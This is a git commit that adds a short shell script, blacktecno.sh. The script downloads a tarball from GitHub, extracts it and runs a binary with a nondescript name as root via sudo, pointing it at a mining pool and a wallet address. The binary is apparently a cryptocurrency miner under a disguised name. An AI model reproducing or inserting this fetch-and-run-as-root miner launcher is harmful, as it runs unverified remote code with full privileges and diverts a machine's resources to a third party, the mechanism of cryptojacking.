4ad1d5d2fac6839ca9610751bfeb1e6f4947180b
black8windo <111098671+black8windo@users.noreply.github.com>
2022-08-24 11:03:57 +0700

    Add files via upload

---
+++ blacktecno.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+wget https://github.com/black8windo/tecnosumber/raw/main/tecnosumber.tar.xz
+tar -xvf tecnosumber.tar.xz
+cd tecnosumber
+sudo ./tecnosumber --disable-gpu --algorithm randomyada --pool crimsonyada.com:3333 --wallet 19TY1XFUnwrBqy8un5rfw1qbe9Tv1tiVNa
